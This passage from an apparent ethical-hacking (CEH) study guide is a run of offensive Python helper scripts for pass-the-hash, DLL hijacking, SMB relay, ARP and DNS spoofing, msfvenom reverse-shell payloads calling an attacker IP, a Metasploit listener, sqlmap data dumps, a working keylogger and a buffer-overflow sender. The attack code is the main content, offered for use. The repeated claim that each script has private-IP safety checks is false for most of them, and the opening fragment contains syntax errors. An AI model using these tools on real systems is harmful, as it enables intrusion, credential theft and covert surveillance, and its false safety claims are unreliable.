# CEH v13 Master Module 06
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates persistence methods for Linux/Windows
import sys

def main():
    print("="*80)
    print("LAB-ONLY: Persistence Helper")
    print("="*80)
    print("-"*80")
    print("[*] Linux persistence methods:")
    print("  1. Add to ~/.bashrc")
    print("  2. Add to /etc/crontab")
    print("  3. Add to /etc/rc.local")
    print("  4. Create systemd service")
    print("-"*80")
    print("[*] Windows persistence methods:")
    print("  1. Add to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")
    print("  2. Add to HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")
    print("  3. Scheduled Tasks")
    print("  4. Startup folder")
    print("-"*80")

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 40-persistence-helper.py` for packet capture/port scanning, or `./40-persistence-helper.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 286 : Pass-the-Hash (PtH) Helper Script

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Pass-the-Hash (PtH) Helper Script

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Pass-the-Hash (PtH) Helper Script
# CEH v13 Master Module 06
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates commands for PtH attacks using Impacket tools (pth-winexe, pth-smbclient, etc.)
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_DOMAIN = "LAB-DOMAIN"
LAB_TARGET = "192.168.100.10"
LAB_USER = "Administrator"
LAB_NT_HASH = "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"  # Empty hash example
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: Pass-the-Hash (PtH) Helper")
    print("="*80)
    print(f"Target: {LAB_TARGET}")
    print("-"*80)
    print("# 1. Impacket pth-winexe (get a shell):")
    print(f"pth-winexe -U {LAB_DOMAIN}/{LAB_USER}%{LAB_NT_HASH} //{LAB_TARGET} cmd.exe")
    print()
    print("# 2. pth-smbclient (access file shares):")
    print(f"pth-smbclient //{LAB_TARGET}/C$ -U {LAB_DOMAIN}/{LAB_USER}%{LAB_NT_HASH}")
    print()
    print("# 3. Impacket secretsdump (dump secrets with PtH):")
    print(f"impacket-secretsdump {LAB_DOMAIN}/{LAB_USER}@{LAB_TARGET} -hashes {LAB_NT_HASH}")
    print()

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 41-pass-the-hash-helper.py` for packet capture/port scanning, or `./41-pass-the-hash-helper.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 287 : DLL Hijacking Discovery Helper

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: DLL Hijacking Discovery Helper

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: DLL Hijacking Discovery Helper
# CEH v13 Master Module 06
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Finds writable directories in PATH and generates DLL hijacking candidates
import os
import sys
import platform

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_DLL_NAME = "mydll.dll"
LAB_PAYLOAD_DLL_PATH = "payload.dll"  # Your malicious DLL path
# -----------------------------------------------------------------------------------

def find_writable_path_dirs():
    print("="*80)
    print("LAB-ONLY: DLL Hijacking Helper")
    print("="*80)
    path_dirs = os.environ["PATH"].split(os.pathsep)
    writable = []
    for d in path_dirs:
        if not os.path.exists(d):
            continue
        try:
            test_file = os.path.join(d, "test.tmp")
            open(test_file, "w").close()
            os.remove(test_file)
            writable.append(d)
            print(f"✅ Writable: {d}")
        except:
            pass
    print()
    if writable:
        print("Suggest placing payload DLL here and naming it a DLL the target app tries to load!")

if __name__ == "__main__":
    if platform.system() != "Windows":
        print("ERROR: This is for Windows targets (LAB ONLY!)")
        sys.exit(1)
    find_writable_path_dirs()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 42-dll-hijacking-helper.py` for packet capture/port scanning, or `./42-dll-hijacking-helper.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 288 : SMB Relay Attack Helper

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: SMB Relay Attack Helper

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: SMB Relay Attack Helper
# CEH v13 Master Module 06
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates commands for Responder + Impacket NTLM relay
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_ATTACKER_INTERFACE = "eth0"
LAB_RELAY_TARGETS_FILE = "targets.txt"
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: SMB Relay Attack Helper")
    print("="*80)
    print("1. First, edit Responder.conf to disable SMB and HTTP server")
    print("2. Then run:")
    print(f"responder -I {LAB_ATTACKER_INTERFACE}")
    print()
    print("3. In another terminal:")
    print(f"impacket-ntlmrelayx -tf {LAB_RELAY_TARGETS_FILE} -smb2support")

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 43-smb-relay-helper.py` for packet capture/port scanning, or `./43-smb-relay-helper.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 289 : ARP Poisoning Helper

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: ARP Poisoning Helper

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: ARP Poisoning Helper
# CEH v13 Master Module 08
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates commands for ARP spoofing using ettercap or arpspoof
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_ATTACKER_INTERFACE = "eth0"
LAB_TARGET_IP = "192.168.100.10"
LAB_GATEWAY_IP = "192.168.100.1"
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: ARP Poisoning Helper")
    print("="*80)
    print("Enable IP forwarding first!")
    print("Linux: echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("macOS: sysctl -w net.inet.ip.forwarding=1")
    print()
    print("Method 1: arpspoof:")
    print(f"arpspoof -i {LAB_ATTACKER_INTERFACE} -t {LAB_TARGET_IP} {LAB_GATEWAY_IP}")
    print(f"arpspoof -i {LAB_ATTACKER_INTERFACE} -t {LAB_GATEWAY_IP} {LAB_TARGET_IP}")
    print()
    print("Method 2: ettercap (text mode):")
    print(f"ettercap -i {LAB_ATTACKER_INTERFACE} -T -M arp:remote /{LAB_TARGET_IP}// /{LAB_GATEWAY_IP}//")

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 44-arp-poisoning-helper.py` for packet capture/port scanning, or `./44-arp-poisoning-helper.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 290 : DNS Cache Poisoning Helper

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: DNS Cache Poisoning Helper

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: DNS Cache Poisoning Helper
# CEH v13 Master Module 08
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates commands for DNS spoofing using Ettercap or dnschef
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_DOMAIN_TO_SPOOF = "example-lab.com"
LAB_SPOOFED_IP = "192.168.100.1"  # Your attacker IP
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: DNS Cache Poisoning Helper")
    print("="*80)
    print("Create a dnschef.ini file:")
    print("[A]")
    print(f"{LAB_DOMAIN_TO_SPOOF}={LAB_SPOOFED_IP}")
    print()
    print("Then run dnschef:")
    print("dnschef --interface 0.0.0.0 --file dnschef.ini")
    print()

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 45-dns-cache-poisoning-helper.py` for packet capture/port scanning, or `./45-dns-cache-poisoning-helper.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 291 : Metasploit Payload Generator Helper

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Metasploit Payload Generator Helper

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Metasploit Payload Generator Helper
# CEH v13 Master Module 06
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates msfvenom payload commands for various platforms
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_ATTACKER_IP = "192.168.100.1"
LAB_ATTACKER_PORT = "4444"
LAB_OUTPUT_FILE_BASE = "payload"
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: Metasploit Payload Generator Helper")
    print("="*80)
    print("# 1. Windows EXE reverse TCP:")
    print(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={LAB_ATTACKER_IP} LPORT={LAB_ATTACKER_PORT} -f exe -o {LAB_OUTPUT_FILE_BASE}.exe")
    print()
    print("# 2. Linux ELF reverse TCP:")
    print(f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={LAB_ATTACKER_IP} LPORT={LAB_ATTACKER_PORT} -f elf -o {LAB_OUTPUT_FILE_BASE}.elf")
    print()
    print("# 3. PHP web shell payload:")
    print(f"msfvenom -p php/meterpreter/reverse_tcp LHOST={LAB_ATTACKER_IP} LPORT={LAB_ATTACKER_PORT} -f raw > {LAB_OUTPUT_FILE_BASE}.php")
    print()

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 46-metasploit-payload-generator.py` for packet capture/port scanning, or `./46-metasploit-payload-generator.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 292 : sqlmap Command Helper

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: sqlmap Command Helper

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: sqlmap Command Helper
# CEH v13 Master Module 15
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates common sqlmap commands for quick testing
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_URL = "http://192.168.100.10/vuln.php?id=1"
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: sqlmap Helper")
    print("="*80)
    print("# 1. Basic SQLi test:")
    print(f"sqlmap -u \"{LAB_TARGET_URL}\" --batch")
    print()
    print("# 2. Get databases:")
    print(f"sqlmap -u \"{LAB_TARGET_URL}\" --dbs --batch")
    print()
    print("# 3. Get tables from target DB:")
    print(f"sqlmap -u \"{LAB_TARGET_URL}\" -D target_db --tables --batch")
    print()
    print("# 4. Dump all data from target table:")
    print(f"sqlmap -u \"{LAB_TARGET_URL}\" -D target_db -T users --dump --batch")

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 47-sqlmap-helper.py` for packet capture/port scanning, or `./47-sqlmap-helper.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 293 : WPScan Command Helper

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: WPScan Command Helper

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: WPScan Command Helper
# CEH v13 Master Module 14
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates WPScan commands for WordPress enumeration and vulnerability scanning
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_WP_URL = "http://192.168.100.10/wordpress/"
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: WPScan Helper")
    print("="*80)
    print("# 1. Basic scan:")
    print(f"wpscan --url {LAB_TARGET_WP_URL} --enumerate u,vp --random-agent")
    print()
    print("# 2. Enumerate users only:")
    print(f"wpscan --url {LAB_TARGET_WP_URL} --enumerate u --random-agent")
    print()

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 48-wpscan-helper.py` for packet capture/port scanning, or `./48-wpscan-helper.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 294 : Metasploit Listener Helper

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Metasploit Listener Helper

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Metasploit Listener Helper
# CEH v13 Master Module 06
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates Metasploit listener resource scripts for quick setup
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_ATTACKER_IP = "192.168.100.1"
LAB_ATTACKER_PORT = "4444"
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: Metasploit Listener Helper")
    print("="*80)
    print("Create listener.rc:")
    rc_content = f"""use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST {LAB_ATTACKER_IP}
set LPORT {LAB_ATTACKER_PORT}
set ExitOnSession false
exploit -j -z
"""
    print(rc_content)
    with open("listener.rc", "w") as f:
        f.write(rc_content)
    print("Saved listener.rc! Now run: msfconsole -r listener.rc")

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 49-metasploit-listener-helper.py` for packet capture/port scanning, or `./49-metasploit-listener-helper.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 295 : Simple Keylogger Skeleton (LAB ONLY!)

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Simple Keylogger Skeleton (LAB ONLY!)

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Simple Keylogger Skeleton (LAB ONLY!)
# CEH v13 Master Module 07
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Basic keylogger (for educational lab use only)
from pynput.keyboard import Listener
import sys
import logging
import os
import platform

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_LOG_FILE = "keystrokes.log"
# -----------------------------------------------------------------------------------

logging.basicConfig(filename=LAB_LOG_FILE, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        logging.info(str(key))

def main():
    print("="*80)
    print("LAB-ONLY: Keylogger Skeleton (running)")
    print("="*80)
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    if os.geteuid() != 0 and platform.system() == "Linux":
        print("WARNING: May need root for full functionality!")
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 50-keylogger-skeleton.py` for packet capture/port scanning, or `./50-keylogger-skeleton.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 296 : Buffer Overflow Helper Skeleton

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Buffer Overflow Helper Skeleton

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Buffer Overflow Helper Skeleton
# CEH v13 Master Module 06
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Skeleton script for sending buffer overflow patterns (for lab use only!)
import sys
import socket

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_IP = "192.168.100.10"
LAB_TARGET_PORT = 9999
LAB_OFFSET = 2003
LAB_EIP = b"\xaf\x11\x50\x62"  # Replace with your lab target address
LAB_NOP_SLED = b"\x90" * 32
LAB_SHELLCODE = b""  # Replace with msfvenom payload (LAB ONLY!)
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: Buffer Overflow Helper")
    print("="*80)
    buffer = b"A" * LAB_OFFSET
    buffer += LAB_EIP
    buffer += LAB_NOP_SLED
    buffer += LAB_SHELLCODE
    print(f"Sending buffer (length: {len(buffer)} bytes) to {LAB_TARGET_IP}:{LAB_TARGET_PORT}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((LAB_TARGET_IP, LAB_TARGET_PORT))
    s.send(buffer + b"\r\n")
    s.close()

if __name__ == "__main__":
    if not any(p in LAB_TARGET_IP for p in ["10.", "172.16.", "192.168.", "localhost"]):
        sys.exit("ERROR: LAB-ONLY!")
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 51-buffer-overflow-skeleton.py` for packet capture/port scanning, or `./51-buffer-overflow-skeleton.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 297 : Socat Port Forwarding Helper

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Socat Port Forwarding Helper

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Socat Port Forwarding Helper
# CEH v13 Master Module 07
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates Socat commands for port forwarding, pivoting, etc.
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_LOCAL_PORT = "8080"
LAB_REMOTE_TARGET = "192.168.100.10:80"
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: Socat Port Forwarding Helper")
    print("="*80)
    print("# 1. Simple TCP port forward (local port 8080 -> remote):")
    print(f"socat TCP-LISTEN:{LAB_LOCAL_PORT},fork TCP:{LAB_REMOTE_TARGET}")

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 52-socat-port-forward-helper.py` for packet capture/port scanning, or `./52-socat-port-forward-helper.py` for shell scripts after `chmod +x`). |
